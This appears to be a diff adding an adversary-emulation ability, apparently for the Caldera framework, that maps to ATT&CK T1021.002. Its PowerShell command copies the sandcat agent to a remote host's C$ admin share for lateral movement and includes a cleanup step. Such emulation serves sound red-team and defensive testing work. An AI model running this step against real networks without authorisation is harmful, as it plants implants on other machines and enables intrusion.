@@ -1,0 +1,36 @@
+- id: 65048ec1-f7ca-49d3-9410-10813e472b30
+  name: Copy 54ndc47 (SMB)
+  description: Copy 54ndc47 to remote host (SMB)
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: "Remote Services: SMB/Windows Admin Shares"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $path = "sandcat.go-windows";
+          $drive = "\\#{remote.host.fqdn}\C$";
+          Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+        cleanup: |
+          $drive = "\\#{remote.host.fqdn}\C$";
+          Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
+        parsers:
+          plugins.stockpile.app.parsers.54ndc47_remote_copy:
+          - source: remote.host.fqdn
+            edge: has_54ndc47_copy
+        payloads:
+        - sandcat.go-windows
+  singleton: True
+  requirements:
+  - plugins.stockpile.app.requirements.not_exists:
+    - source: remote.host.fqdn
+      edge: has_54ndc47_copy
+  - plugins.stockpile.app.requirements.basic:
+    - source: remote.host.fqdn
+      edge: has_share
+  - plugins.stockpile.app.requirements.no_backwards_movement:
+    - source: remote.host.fqdn
+  - plugins.stockpile.app.requirements.reachable:
+      - source: remote.host.fqdn
+        edge: isAccessibleFrom
